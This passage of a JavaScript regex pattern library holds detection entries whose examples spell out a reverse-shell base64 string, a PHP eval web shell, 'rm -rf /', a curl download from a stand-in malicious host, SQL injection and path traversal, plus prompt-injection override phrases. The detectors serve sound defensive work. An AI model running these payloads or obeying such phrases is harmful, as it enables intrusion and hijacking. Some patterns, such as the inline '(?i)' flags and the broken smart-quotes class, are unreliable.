    pattern: '\\b(let|const|var|final|auto)\\s+[A-Za-z_][A-Za-z0-9_]*',
    flags: 'g',
    explanation: 'Matches variable declaration keywords.',
    examples: ['let x = 5', 'const name = "John"', 'var count'],
  },

  classDecl: {
    id: 'class-decl',
    category: 'Programming',
    name: 'Class Declarations',
    description: 'Extract class declarations',
    pattern: '\\bclass\\s+[A-Za-z_][A-Za-z0-9_]*',
    flags: 'g',
    explanation: 'Matches class declaration syntax.',
    examples: ['class User', 'class MyClass(Base)'],
  },

  todoComment: {
    id: 'todo-comment',
    category: 'Programming',
    name: 'TODO / FIXME Comments',
    description: 'Extract TODO/FIXME/BUG/HACK comments',
    pattern: '\\b(TODO|FIXME|BUG|HACK):?.*$',
    flags: 'gmi',
    explanation: 'Matches code annotations.',
    examples: ['TODO: refactor this', 'FIXME: bug here'],
  },

  deprecatedCall: {
    id: 'deprecated-call',
    category: 'Programming',
    name: 'Deprecated API Calls',
    description: 'Detect deprecated API usage',
    pattern: '\\b(deprecated|legacy|outdated)[A-Za-z0-9_]*\\b',
    flags: 'gi',
    explanation: 'Matches deprecated function names.',
    examples: ['deprecatedMethod()', 'legacyAPI'],
  },

  /* JavaScript / TypeScript */
  jsProperty: {
    id: 'js-property',
    category: 'Programming',
    name: 'JS Object Properties',
    description: 'Extract object property assignments',
    pattern: '(?<=\\b[A-Za-z0-9_]+:)\\s*[^,}\\n]+',
    flags: 'g',
    explanation: 'Matches object property values.',
    examples: ['name: "John"', 'age: 30'],
  },

  jsImportMembers: {
    id: 'js-import-members',
    category: 'Programming',
    name: 'JavaScript Named Imports',
    description: 'Extract named imports from modules',
    pattern: 'import\\s*\\{([^}]*)\\}',
    flags: 'g',
    explanation: 'Matches ES6 named imports.',
    examples: ['import { useState, useEffect }'],
  },

  jsDangerEval: {
    id: 'js-danger-eval',
    category: 'Security',
    name: 'Dangerous JavaScript eval()',
    description: 'Detect eval() usage',
    pattern: '\\beval\\s*\\(',
    flags: 'g',
    explanation: 'Matches eval function calls.',
    examples: ['eval(code)', 'eval(userInput)'],
  },

  reactProps2: {
    id: 'react-props-2',
    category: 'Programming',
    name: 'React JSX Prop Attributes',
    description: 'Extract JSX prop assignments',
    pattern: '\\b([A-Za-z_][A-Za-z0-9_]*)=({[^}]+}|"[^"]+"|\'[^\']+\')',
    flags: 'g',
    explanation: 'Matches JSX attributes.',
    examples: ['onClick={handler}', 'className="btn"'],
  },

  tsTypeAlias: {
    id: 'ts-type-alias',
    category: 'Programming',
    name: 'TypeScript Type Alias',
    description: 'Extract TypeScript type definitions',
    pattern: '\\btype\\s+[A-Za-z0-9_]+\\s*=',
    flags: 'g',
    explanation: 'Matches TypeScript type aliases.',
    examples: ['type User = { name: string }'],
  },

  /* Python */
  pythonDecorator: {
    id: 'py-decorator',
    category: 'Programming',
    name: 'Python Decorators',
    description: 'Extract Python decorator definitions',
    pattern: '^\\s*@([A-Za-z_][A-Za-z0-9_\\.]+)',
    flags: 'gm',
    explanation: 'Matches Python decorators.',
    examples: ['@property', '@app.route("/")'],
  },

  pythonDocstring2: {
    id: 'py-docstring-2',
    category: 'Programming',
    name: 'Python Docstrings',
    description: 'Extract docstring blocks',
    pattern: '"""[\\s\\S]*?"""|\'\'\'[\\s\\S]*?\'\'\'',
    flags: 'g',
    explanation: 'Matches Python docstrings.',
    examples: ['"""This is a docstring"""'],
  },

  pythonImport2: {
    id: 'py-import-2',
    category: 'Programming',
    name: 'Python Import Statements',
    description: 'Extract Python imports',
    pattern: '\\b(import|from)\\s+[A-Za-z0-9_\\.]+',
    flags: 'g',
    explanation: 'Matches Python import syntax.',
    examples: ['import numpy', 'from os import path'],
  },

  /* Rust & Go */
  rustStruct: {
    id: 'rust-struct',
    category: 'Programming',
    name: 'Rust Struct Definitions',
    description: 'Extract Rust struct blocks',
    pattern: '\\bstruct\\s+[A-Za-z0-9_]+\\s*\\{[\\s\\S]*?\\}',
    flags: 'g',
    explanation: 'Matches Rust struct definitions.',
    examples: ['struct User { id: u32, name: String }'],
  },

  rustImpl: {
    id: 'rust-impl',
    category: 'Programming',
    name: 'Rust impl Blocks',
    description: 'Extract Rust impl blocks',
    pattern: '\\bimpl\\s+[A-Za-z0-9_]+\\s*\\{[\\s\\S]*?\\}',
    flags: 'g',
    explanation: 'Matches Rust implementation blocks.',
    examples: ['impl User { fn new() {} }'],
  },

  goStruct2: {
    id: 'go-struct-2',
    category: 'Programming',
    name: 'Go Struct Declaration',
    description: 'Extract Go struct definitions',
    pattern: '\\btype\\s+[A-Za-z0-9_]+\\s+struct\\s*\\{[\\s\\S]*?\\}',
    flags: 'g',
    explanation: 'Matches Go struct syntax.',
    examples: ['type User struct { ID int; Name string }'],
  },

  goChannelOp: {
    id: 'go-channel',
    category: 'Programming',
    name: 'Go Channel Operations',
    description: 'Extract Go channel send/receive',
    pattern: '<-|<-\\s*[A-Za-z0-9_]+',
    flags: 'g',
    explanation: 'Matches Go channel operators.',
    examples: ['<-ch', 'ch <- value'],
  },

  /* Other Languages */
  luaFunction2: {
    id: 'lua-func-2',
    category: 'Programming',
    name: 'Lua Function Definitions',
    description: 'Extract Lua functions',
    pattern: '\\bfunction\\s+[A-Za-z0-9_.:]+\\s*\\([^)]*\\)',
    flags: 'g',
    explanation: 'Matches Lua function syntax.',
    examples: ['function myFunc(a, b)', 'function table.method()'],
  },

  phpVariable2: {
    id: 'php-var-2',
    category: 'Programming',
    name: 'PHP Variable Names',
    description: 'Extract PHP variables',
    pattern: '\\$[A-Za-z_][A-Za-z0-9_]*',
    flags: 'g',
    explanation: 'Matches PHP variable syntax.',
    examples: ['$user', '$_POST', '$this->name'],
  },

  rubyBlock2: {
    id: 'ruby-block-2',
    category: 'Programming',
    name: 'Ruby Blocks',
    description: 'Extract Ruby block syntax',
    pattern: '\\{\\s*\\|[^|]+\\|[\\s\\S]*?\\}',
    flags: 'g',
    explanation: 'Matches Ruby block patterns.',
    examples: ['{|x| x * 2}', '{|item| process(item)}'],
  },

  sqlJoin2: {
    id: 'sql-join-2',
    category: 'SQL',
    name: 'SQL JOIN Clauses',
    description: 'Extract SQL JOIN statements',
    pattern: '\\b(INNER|LEFT|RIGHT|FULL)?\\s*JOIN\\s+[A-Za-z0-9_]+',
    flags: 'gi',
    explanation: 'Matches SQL JOIN syntax.',
    examples: ['JOIN users', 'LEFT JOIN orders'],
  },

  shellPipes2: {
    id: 'shell-pipes-2',
    category: 'Shell',
    name: 'Piped Shell Commands',
    description: 'Extract shell command pipelines',
    pattern: '\\b\\w+(?:\\s+[^|]+)?\\s*\\|\\s*\\w+',
    flags: 'g',
    explanation: 'Matches piped commands.',
    examples: ['cat file | grep pattern', 'ls | sort'],
  },

  /* DevOps */
  dockerInstruction2: {
    id: 'docker-instruction-2',
    category: 'DevOps',
    name: 'Dockerfile Commands',
    description: 'Extract Dockerfile instructions',
    pattern: '\\b(FROM|RUN|CMD|COPY|ENTRYPOINT|ENV|WORKDIR)\\b',
    flags: 'gi',
    explanation: 'Matches Dockerfile keywords.',
    examples: ['FROM node:18', 'RUN npm install'],
  },

  yamlStep2: {
    id: 'yaml-step-2',
    category: 'DevOps',
    name: 'CI Pipeline Step',
    description: 'Extract CI/CD pipeline steps',
    pattern: '^\\s*-\\s+name:\\s+.+$',
    flags: 'gm',
    explanation: 'Matches YAML step definitions.',
    examples: ['- name: Install dependencies'],
  },

  gitHash2: {
    id: 'git-hash-2',
    category: 'DevOps',
    name: 'Git Commit Hash',
    description: 'Extract git commit hashes',
    pattern: '\\b[a-f0-9]{7,40}\\b',
    flags: 'gi',
    explanation: 'Matches git SHA hashes.',
    examples: ['abc1234', 'a1b2c3d4e5f6g7h8i9j0'],
  },

  gitAddedLine2: {
    id: 'git-added-2',
    category: 'DevOps',
    name: 'Git Diff Added Lines',
    description: 'Extract added lines from git diff',
    pattern: '^\\+[^+].*$',
    flags: 'gm',
    explanation: 'Matches git added lines.',
    examples: ['+ new feature added'],
  },

  gitRemovedLine2: {
    id: 'git-removed-2',
    category: 'DevOps',
    name: 'Git Diff Removed Lines',
    description: 'Extract removed lines from git diff',
    pattern: '^-[^-].*$',
    flags: 'gm',
    explanation: 'Matches git removed lines.',
    examples: ['- old code here'],
  },

  /* Data Engineering */
  csvRowStrict: {
    id: 'csv-row-strict',
    category: 'Data',
    name: 'CSV Row (Strict Quoted Fields)',
    description: 'Extract CSV row fields with quoted handling',
    pattern: '"([^"]*)"|([^,]+)',
    flags: 'g',
    explanation: 'Matches CSV fields.',
    examples: ['"field 1","field 2"', 'plain,values'],
  },

  logJsonKv: {
    id: 'log-json-kv',
    category: 'Logs',
    name: 'Log Key=Value Pairs',
    description: 'Extract key=value pairs from logs',
    pattern: '\\b([A-Za-z0-9_]+)=("[^"]+"|[^\\s]+)',
    flags: 'g',
    explanation: 'Matches structured log entries.',
    examples: ['timestamp="2024-01-20" level=ERROR'],
  },

  multilineStack2: {
    id: 'multiline-stack-2',
    category: 'Errors',
    name: 'Multi-line Stacktrace Block',
    description: 'Extract complete stacktrace blocks',
    pattern: '(Error|Exception)[\\s\\S]+?(?=\\n\\n|$)',
    flags: 'g',
    explanation: 'Matches error blocks.',
    examples: ['Error: something went wrong\\n  at line 5'],
  },

  ipv4Range2: {
    id: 'ipv4-range-2',
    category: 'Network',
    name: 'IPv4 Range (start-end)',
    description: 'Extract IP address ranges',
    pattern: '\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\s*-\\s*(?:\\d{1,3}\\.){3}\\d{1,3}\\b',
    flags: 'g',
    explanation: 'Matches IP range notation.',
    examples: ['192.168.0.1 - 192.168.0.255'],
  },

  /* Text / NLP */
  paragraph2: {
    id: 'paragraph-2',
    category: 'Text',
    name: 'Paragraph Blocks',
    description: 'Extract paragraph blocks',
    pattern: '([^\\n][\\s\\S]*?)(?:\\n\\n|$)',
    flags: 'g',
    explanation: 'Matches paragraph separations.',
    examples: ['First paragraph\\n\\nSecond paragraph'],
  },

  htmlTitle2: {
    id: 'html-title-2',
    category: 'Web',
    name: 'HTML Title Tag',
    description: 'Extract HTML title tag content',
    pattern: '<title>([^<]+)<\\/title>',
    flags: 'i',
    explanation: 'Matches HTML title tag.',
    examples: ['<title>Page Title</title>'],
  },

  phoneIntlBroad: {
    id: 'phone-intl-broad',
    category: 'Common',
    name: 'International Phone Numbers',
    description: 'Extract international and domestic phone numbers with flexible formatting',
    pattern: '(?:\\+\\d{1,3})?[\\s.\\-]?(?:\\(?\\d{1,4}\\)?[\\s.\\-()]*){2,}',
    flags: 'g',
    explanation: 'Matches international and domestic phone numbers. Optionally starts with + and country code. Supports flexible separators (spaces, dots, dashes, parentheses) between digit segments.',
    examples: ['+1-555-123-4567', '+44 20 7946 0958'],
  },

  yearRange2: {
    id: 'year-range-2',
    category: 'Text',
    name: 'Years 1900–2099',
    description: 'Extract 4-digit years',
    pattern: '\\b(19|20)\\d{2}\\b',
    flags: 'g',
    explanation: 'Matches 4-digit years.',
    examples: ['1999', '2024', '2050'],
  },

  /* AI / Prompt Engineering */
  aiRoleMarker: {
    id: 'ai-role',
    category: 'AI',
    name: 'AI Prompt Role Markers',
    description: 'Extract role markers in AI prompts',
    pattern: '^\\s*(system|assistant|user):',
    flags: 'gmi',
    explanation: 'Matches AI prompt role prefixes.',
    examples: ['system:', 'user: hello', 'assistant: response'],
  },

  promptInjection2: {
    id: 'prompt-injection-2',
    category: 'Security',
    name: 'Prompt Injection Indicators',
    description: 'Detect prompt injection attempts',
    pattern: '(?i)(ignore previous|forget all|system override|break instructions)',
    flags: 'g',
    explanation: 'Matches injection keywords.',
    examples: ['ignore previous instructions', 'system override'],
  },

  xmlModelOutput: {
    id: 'xml-model-output',
    category: 'AI',
    name: 'AI Model Output XML Nodes',
    description: 'Extract XML model output nodes',
    pattern: '<response>[\\s\\S]*?<\\/response>',
    flags: 'gi',
    explanation: 'Matches XML response tags.',
    examples: ['<response>Model output here</response>'],
  },

  /* Cleanup / Scraping */
  htmlEntities2: {
    id: 'html-entities-2',
    category: 'Cleaning',
    name: 'HTML Entity Codes',
    description: 'Extract HTML entity codes',
    pattern: '&[A-Za-z0-9#]+;',
    flags: 'g',
    explanation: 'Matches HTML entities.',
    examples: ['&nbsp;', '&#169;', '&lt;'],
  },

  wordNumberToken: {
    id: 'word-number-token',
    category: 'Text',
    name: 'Word+Number Tokens',
    description: 'Extract word-number combinations',
    pattern: '\\b[A-Za-z]+\\d+\\b',
    flags: 'g',
    explanation: 'Matches word-digit tokens.',
    examples: ['item123', 'user456', 'file001'],
  },

  /* Batch 6 - Cybersecurity */
  base64ShellPayload: {
    id: 'b64-shell',
    category: 'Security',
    name: 'Base64 Shell Payloads',
    description: 'Detect base64 encoded shell commands',
    pattern: '(^|\\s)([A-Za-z0-9+/]{100,}={0,2})(?=\\s|$)',
    flags: 'g',
    explanation: 'Matches long base64 strings (potential payloads).',
    examples: ['YmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4x...'],
  },

  encodedPowerShell: {
    id: 'enc-powershell',
    category: 'Security',
    name: 'Encoded PowerShell Commands',
    description: 'Detect encoded PowerShell invocations',
    pattern: 'powershell.exe.*?-enc\\s+[A-Za-z0-9+/=]+',
    flags: 'gi',
    explanation: 'Matches PowerShell -enc encoded commands.',
    examples: ['powershell.exe -enc JABjAG8AbQA='],
  },

  pathTraversal: {
    id: 'path-traversal',
    category: 'Security',
    name: 'Path Traversal Sequences',
    description: 'Detect directory traversal attempts',
    pattern: '(\\.\\./|\\.\\.\\\\){1,}',
    flags: 'g',
    explanation: 'Matches ../ or ..\\ sequences.',
    examples: ['../../etc/passwd', '..\\..\\windows\\system32'],
  },

  phpShellUpload: {
    id: 'php-shell-upload',
    category: 'Security',
    name: 'PHP Upload Shell Indicators',
    description: 'Detect PHP shell upload patterns',
    pattern: '<\\?php[\\s\\S]{0,30}\\beval\\b',
    flags: 'gi',
    explanation: 'Matches PHP eval() shells.',
    examples: ['<?php eval($_POST[\"cmd\"]);'],
  },

  attackQuerystring: {
    id: 'attack-query',
    category: 'Security',
    name: 'Attack Querystring Params',
    description: 'Detect suspicious query parameters',
    pattern: '(?i)(cmd=|exec=|shell=|payload=|redirect=)',
    flags: 'g',
    explanation: 'Matches attack parameter patterns.',
    examples: ['?cmd=whoami', '&exec=calc.exe'],
  },

  reverseShell: {
    id: 'reverse-shell',
    category: 'Security',
    name: 'Reverse Shell Connections',
    description: 'Detect IP:port reverse shell patterns',
    pattern: '\\b\\d{1,3}(?:\\.\\d{1,3}){3}:\\d{2,5}\\b',
    flags: 'g',
    explanation: 'Matches attacker IP:port.',
    examples: ['192.168.1.100:4444', '10.0.0.5:8080'],
  },

  sshPrivateKey: {
    id: 'ssh-private',
    category: 'Security',
    name: 'SSH Private Key Block',
    description: 'Detect exposed SSH private keys',
    pattern: '-----BEGIN OPENSSH PRIVATE KEY-----[\\s\\S]*?-----END OPENSSH PRIVATE KEY-----',
    flags: 'g',
    explanation: 'Matches SSH private key PEM blocks.',
    examples: ['-----BEGIN OPENSSH PRIVATE KEY-----...-----END OPENSSH PRIVATE KEY-----'],
  },

  /* FinTech / Fraud Detection */
  ibanFlexible: {
    id: 'iban-flex',
    category: 'Finance',
    name: 'Flexible IBAN Formats',
    description: 'Extract IBAN with spacing variants',
    pattern: '\\b[A-Z]{2}[0-9]{2}(?:\\s?[A-Z0-9]{3,}){2,}\\b',
    flags: 'gi',
    explanation: 'Matches IBAN with optional spaces.',
    examples: ['DE89 3704 0044 0532 0130 00', 'GB82WEST12345698765432'],
  },

  swiftBranch: {
    id: 'swift-branch',
    category: 'Finance',
    name: 'SWIFT/BIC w/ Branch',
    description: 'Extract SWIFT codes with branch codes',
    pattern: '\\b[A-Z]{6}[A-Z0-9]{5}\\b',
    flags: 'g',
    explanation: 'Matches 11-digit SWIFT/BIC codes.',
    examples: ['CHASCHUS33XXX'],
  },

  creditCardLoose: {
    id: 'credit-card-loose',
    category: 'Finance',
    name: 'Credit Card Pattern (Loose)',
    description: 'Detect credit card patterns loosely',
    pattern: '\\b(?:4\\d{3}|5[1-5]\\d{2}|3[47]\\d{2}|6(?:011|5\\d{2}))[- ]?\\d{4}[- ]?\\d{4}[- ]?\\d{4}\\b',
    flags: 'g',
    explanation: 'Matches Visa/MC/Amex/Discover patterns.',
    examples: ['4532-1111-2222-3333', '5500 0000 0000 0004'],
  },

  btcWallet: {
    id: 'btc-wallet',
    category: 'Finance',
    name: 'Bitcoin Wallet Address',
    description: 'Extract Bitcoin wallet addresses',
    pattern: '\\b(bc1|[13])[A-Za-z0-9]{25,39}\\b',
    flags: 'g',
    explanation: 'Matches Bitcoin address formats.',
    examples: ['1A1z7agoat8Bt89ZVzZ8Hc8Ndc7SYD9EqJ'],
  },

  ethWallet: {
    id: 'eth-wallet',
    category: 'Finance',
    name: 'Ethereum Wallet Address',
    description: 'Extract Ethereum wallet addresses',
    pattern: '\\b0x[a-fA-F0-9]{40}\\b',
    flags: 'g',
    explanation: 'Matches Ethereum address format.',
    examples: ['0x5aAeb6053ba3EEd4BBCaB2F5b00f900000000000'],
  },

  /* AI / Dataset Cleaning */
  aiHedging: {
    id: 'ai-hedging',
    category: 'AI',
    name: 'AI Hedging Phrases',
    description: 'Detect AI-specific hedging language',
    pattern: '\\b(as an AI|as a language model|I cannot|I\'m unable to)\\b',
    flags: 'gi',
    explanation: 'Matches AI response patterns.',
    examples: ['As an AI', 'I cannot access'],
  },

  doubleSpaceAfterPunctuation: {
    id: 'double-space-punctuation',
    category: 'Cleaning',
    name: 'Double Space After Punctuation',
    description: 'Find double spaces after punctuation',
    pattern: '([.!?])  +(\\w)',
    flags: 'g',
    explanation: 'Matches extra spaces after period.',
    examples: ['Hello.  World', 'Really?  Yes'],
  },

  smartQuotes: {
    id: 'smart-quotes',
    category: 'Cleaning',
    name: 'Smart Quotes',
    description: 'Detect curly/smart quotes',
    pattern: '[""\'\']',
    flags: 'g',
    explanation: 'Matches Unicode smart quotes.',
    examples: ['"Hello"\', \'\'quoted\''],
  },

  mdHeaderNoSpace: {
    id: 'md-header-nospace',
    category: 'AI',
    name: 'Markdown Headers Missing Space',
    description: 'Detect malformed markdown headers',
    pattern: '^#{1,6}(?=[^#\\s])',
    flags: 'gm',
    explanation: 'Matches headers without space after #.',
    examples: ['#Header without space'],
  },

  listNumberRepeats: {
    id: 'list-number-repeats',
    category: 'AI',
    name: 'List Repetition Issue',
    description: 'Find repeated numbering in lists',
    pattern: '^\\s*1\\.',
    flags: 'gm',
    explanation: 'Matches list items numbered as 1.',
    examples: ['1. First\\n1. Second (should be 2.)'],
  },

  /* Data Mining / Structure */
  htmlAttributes2: {
    id: 'html-attrs-2',
    category: 'Web',
    name: 'HTML Attribute Extraction',
    description: 'Extract HTML attributes with values',
    pattern: '\\b[A-Za-z-]+="[^"]*"',
    flags: 'g',
    explanation: 'Matches HTML attributes.',
    examples: ['class="container"', 'data-id="123"'],
  },

  numericRange: {
    id: 'numeric-range',
    category: 'Common',
    name: 'Numeric Ranges',
    description: 'Extract numeric ranges',
    pattern: '\\b\\d+\\s*[–-]\\s*\\d+\\b',
    flags: 'g',
    explanation: 'Matches range notation.',
    examples: ['10–20', '1-5'],
  },

  unitValue: {
    id: 'unit-value',
    category: 'Science',
    name: 'Values w/ Units',
    description: 'Extract values with units',
    pattern: '\\b\\d+(?:\\.\\d+)?(px|em|rem|kg|g|cm|mm|%)\\b',
    flags: 'gi',
    explanation: 'Matches measurements.',
    examples: ['10px', '5.5kg', '100%'],
  },

  unixPermissions: {
    id: 'unix-permissions',
    category: 'DevOps',
    name: 'Unix File Permissions',
    description: 'Extract Unix chmod permissions',
    pattern: '\\b[0-7]{3,4}\\b',
    flags: 'g',
    explanation: 'Matches octal permission codes.',
    examples: ['755', '0644'],
  },

  csvRowQuoted: {
    id: 'csv-row-quoted',
    category: 'Data',
    name: 'CSV Quoted Fields w/ Commas',
    description: 'Parse CSV with quoted commas',
    pattern: '"(?:[^"]|"")*"|[^,]+',
    flags: 'g',
    explanation: 'Matches CSV fields with quote handling.',
    examples: ['"Smith, John"', 'normal_field'],
  },

  /* E-Commerce */
  productSize: {
    id: 'product-size',
    category: 'Ecommerce',
    name: 'Product Sizing Tokens',
    description: 'Extract clothing size abbreviations',
    pattern: '\\b(XXL|XL|L|M|S|XS|XXS|3XL|4XL)\\b',
    flags: 'gi',
    explanation: 'Matches size abbreviations.',
    examples: ['M', 'XL', '3XL'],
  },

  priceRange: {
    id: 'price-range',
    category: 'Ecommerce',
    name: 'Price Range',
    description: 'Extract price range expressions',
    pattern: '\\$\\d+(?:\\.\\d{2})?\\s*[–-]\\s*\\$\\d+(?:\\.\\d{2})?',
    flags: 'g',
    explanation: 'Matches price ranges.',
    examples: ['$10.00–$20.00', '$5-$15'],
  },

  skuVariant: {
    id: 'sku-variant',
    category: 'Ecommerce',
    name: 'SKU Color/Size Variant Codes',
    description: 'Extract SKU variant codes',
    pattern: '\\b[A-Z]{2,5}-[A-Z]{2,5}(?:-[A-Z0-9]+)?\\b',
    flags: 'g',
    explanation: 'Matches variant SKU patterns.',
    examples: ['BLK-LRG', 'RED-SM-001'],
  },

  productModel: {
    id: 'product-model',
    category: 'Ecommerce',
    name: 'Product Model Numbers',
    description: 'Extract product model identifiers',
    pattern: '\\b[A-Z0-9]{3,}-[A-Z0-9]{2,}\\b',
    flags: 'gi',
    explanation: 'Matches model number patterns.',
    examples: ['PROD-123', 'MODEL-45'],
  },

  /* Automation */
  cssSelectorToken: {
    id: 'css-selector-token',
    category: 'Automation',
    name: 'CSS Selector Tokens',
    description: 'Extract CSS selector class/id tokens',
    pattern: '[#.][A-Za-z0-9_-]+',
    flags: 'g',
    explanation: 'Matches CSS class/id selectors.',
    examples: ['.btn', '#modal', '.active-item'],
  },

  xpathNode: {
    id: 'xpath-node',
    category: 'Automation',
    name: 'XPath Node Selectors',
    description: 'Extract XPath expressions',
    pattern: '\\/\\/?[A-Za-z0-9_*:-]+(?:\\[[^\\]]+\\])?',
    flags: 'g',
    explanation: 'Matches XPath node patterns.',
    examples: ['//div', '//*[@id="main"]'],
  },

  jsClickHandler: {
    id: 'js-click-handler',
    category: 'Automation',
    name: 'Click Handler Bindings',
    description: 'Detect onclick event handlers',
    pattern: '\\bonclick=["\']([^"\']+)["\']',
    flags: 'gi',
    explanation: 'Matches onclick attributes.',
    examples: ['onclick="handleClick()"'],
  },

  /* Cleanup Advanced */
  multiNewline: {
    id: 'multi-newline',
    category: 'Cleaning',
    name: 'Multiple Blank Lines',
    description: 'Find excessive blank lines',
    pattern: '\\n{3,}',
    flags: 'g',
    explanation: 'Matches 3+ consecutive newlines.',
    examples: ['paragraph1\\n\\n\\nparagraph2'],
  },

  trailingSpaces: {
    id: 'trailing-spaces',
    category: 'Cleaning',
    name: 'Trailing Whitespace',
    description: 'Find trailing spaces/tabs',
    pattern: '[ \\t]+$',
    flags: 'gm',
    explanation: 'Matches end-of-line spaces.',
    examples: ['text  \\n', 'line\\t\\n'],
  },

  htmlNoise: {
    id: 'html-noise',
    category: 'Cleaning',
    name: 'HTML Noisy Entities',
    description: 'Find common HTML entity noise',
    pattern: '&(?:nbsp|amp|quot|lt|gt);',
    flags: 'gi',
    explanation: 'Matches HTML entities from OCR.',
    examples: ['&nbsp;', '&amp;'],
  },

  /* Advanced Text / Semantic */
  asideParen: {
    id: 'aside-paren',
    category: 'Text',
    name: 'Parenthetical Asides',
    description: 'Extract parenthetical clauses',
    pattern: '\\(([^)]{3,})\\)',
    flags: 'g',
    explanation: 'Matches content in parentheses.',
    examples: ['(like this)', '(for example)'],
  },

  emDashClause: {
    id: 'emdash-clause',
    category: 'Text',
    name: 'Em Dash Clauses',
    description: 'Extract em-dash delimited phrases',
    pattern: '[—-]{1,2}[^—\\n]+[—-]{1,2}',
    flags: 'g',
    explanation: 'Matches em-dash enclosed phrases.',
    examples: ['— like this —', '–phrase–'],
  },

  enumeratedList: {
    id: 'enum-list',
    category: 'Text',
    name: 'Enumerated List Items',
    description: 'Extract numbered list items',
    pattern: '^\\s*\\d+\\.\\s+.+$',
    flags: 'gm',
    explanation: 'Matches numbered list format.',
    examples: ['1. Item one', '2. Item two'],
  },

  /* Code Quality / Static Analysis */
  longLine: {
    id: 'long-line',
    category: 'CodeQuality',
    name: 'Long Code Line (>120 chars)',
    description: 'Find overly long lines',
    pattern: '^.{120,}$',
    flags: 'gm',
    explanation: 'Matches lines exceeding 120 characters.',
    examples: ['This is an extremely long line that exceeds the standard 120 character limit and should be refactored...'],
  },

  nestedTernary: {
    id: 'nested-ternary',
    category: 'CodeQuality',
    name: 'Nested Ternary Conditions',
    description: 'Detect nested ternary operators',
    pattern: '\\?.+\\?.+:',
    flags: 'g',
    explanation: 'Matches nested ternary patterns (code smell).',
    examples: ['a ? b ? c : d : e'],
  },

  hardcodedApi: {
    id: 'hardcoded-api',
    category: 'CodeQuality',
    name: 'Hardcoded API URLs',
    description: 'Find hardcoded API endpoints',
    pattern: 'https?:\\/\\/[^\\s"]+api[^\\s"]*',
    flags: 'gi',
    explanation: 'Matches hardcoded URLs with "api".',
    examples: ['https://api.example.com/v1/users'],
  },

  /* Specialized / Niche */
  tokenGeneric: {
    id: 'token-generic',
    category: 'Security',
    name: 'Generic Token/Hash Detection',
    description: 'Extract long hex tokens/hashes',
    pattern: '\\b[a-fA-F0-9]{32,64}\\b',
    flags: 'g',
    explanation: 'Matches 32–64 char hex tokens.',
    examples: ['d41d8cd98f00b204e9800998ecf8427e', 'a665a45920422f9d417e4867efdc4fb8a04a1f3fff1fa07e998e86f7f7a27ae3'],
  },

  temperatureExp: {
    id: 'temperature-exp',
    category: 'Science',
    name: 'Temperature Expressions',
    description: 'Extract temperature values',
    pattern: '\\b-?\\d+(?:\\.\\d+)?°\\s?(C|F|K)\\b',
    flags: 'gi',
    explanation: 'Matches temperature notation.',
    examples: ['25°C', '-40°F', '300°K'],
  },

  /* Batch 7 - Security */
  base64Batch7: {
    id: 'base64-batch7',
    category: 'Security',
    name: 'Base64 Strings',
    description: 'Extract Base64-encoded strings',
    pattern: '\\b(?:[A-Za-z0-9+/]{4})*(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?\\b',
    flags: 'g',
    explanation: 'Matches valid Base64 content, including padding with = or ==.',
    examples: [
      'U29tZSBiYXNlNjQgZGF0YQ==',
      'SGVsbG8=',
      'QmFzZTY0VGVzdA=='
    ],
  },

  jwtBatch7: {
    id: 'jwt-batch7',
    category: 'Security',
    name: 'JWT Tokens',
    description: 'Extract JSON Web Tokens (3-part format)',
    pattern: '\\b[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+\\b',
    flags: 'g',
    explanation: 'Matches header.payload.signature tokens encoded in Base64URL.',
    examples: [
      'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjF9.signature123'
    ],
  },

  sqlInjectionBatch7: {
    id: 'sql-injection-batch7',
    category: 'Security',
    name: 'SQL Injection Keywords',
    description: 'Detect possible SQL injection payloads',
    pattern: '\\b(select|update|drop|insert|delete|union|--|#|;|or\\s+1=1)\\b',
    flags: 'gi',
    explanation: 'Flags suspicious SQL keywords and common injection patterns.',
    examples: [
      "SELECT * FROM users",
      "admin' OR 1=1 --",
      "DROP TABLE accounts;"
    ],
  },

  shellCommand: {
    id: 'shell-command',
    category: 'Security',
    name: 'Shell Commands',
    description: 'Detect dangerous bash commands',
    pattern: '\\b(?:rm\\s+-rf|curl\\s+http|wget\\s+http|chmod\\s+\\+x|bash\\s+-c)\\b',
    flags: 'gi',
    explanation: 'Helps identify dangerous shell operations such as rm -rf or curl execution.',
    examples: [
      'rm -rf /',
      'chmod +x script.sh',
      'curl http://malicious.com/payload'
    ],
  },

  powershellEncoded: {
    id: 'powershell-encoded',
    category: 'Security',
    name: 'PowerShell Encoded Command',
    description: 'Detect encoded PowerShell payload (-enc)',
    pattern: 'powershell\\.exe\\s+-enc\\s+[A-Za-z0-9+/=]+',
    flags: 'gi',
    explanation: 'Matches powershell.exe -enc &lt;base64&gt; payloads used in malware.',
    examples: [
      'powershell.exe -enc SQBFAFgA...',
      'powershell.exe -enc VGhpcyBpcyBhIHRlc3Q='
    ],
  },

  /* Batch 7 - Network */
  fqdn: {
    id: 'fqdn',
    category: 'Network',
    name: 'Domain Names (FQDN)',
    description: 'Extract valid domain names',
    pattern: '\\b(?:[a-zA-Z0-9-]+\\.)+[a-zA-Z]{2,}\\b',
    flags: 'g',
    explanation: 'Matches domain names like example.com or sub.domain.co.uk.',
    examples: [
      'example.com',
      'api.service.company.co.uk'
    ],
  },

  macAddressBatch7: {
    id: 'mac-address-batch7',
    category: 'Network',
    name: 'MAC Addresses',
    description: 'Extract MAC addresses in common formats',
    pattern: '\\b(?:[A-F0-9]{2}:){5}[A-F0-9]{2}\\b',
    flags: 'gi',
    explanation: 'Matches MAC addresses like AA:BB:CC:DD:EE:FF',
    examples: [
      '12:34:56:78:9A:BC',
      'AA:BB:CC:DD:EE:FF'
    ],
  },

  portNumberBatch7: {
    id: 'port-batch7',
    category: 'Network',
    name: 'Port Numbers',
    description: 'Extract valid TCP/UDP port numbers (0–65535)',
    pattern: '\\b(6553[0-5]|655[0-2]\\d|65[0-4]\\d{2}|6[0-4]\\d{3}|[1-5]?\\d{1,4})\\b',
    flags: 'g',
    explanation: 'Ensures values fall within valid port range.',
    examples: [
      '80', '443', '8080', '65535'
    ],
  },

  /* Batch 7 - Code */
  singleLineComment: {
    id: 'single-line-comment',
    category: 'Code',
    name: 'Single-Line Comments',
    description: 'Extract // comments from code',
    pattern: '\\/\\/.*$',
    flags: 'gm',
